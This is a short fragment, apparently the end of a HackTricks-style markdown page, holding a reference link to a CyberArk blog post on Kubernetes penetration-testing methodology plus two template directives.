https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
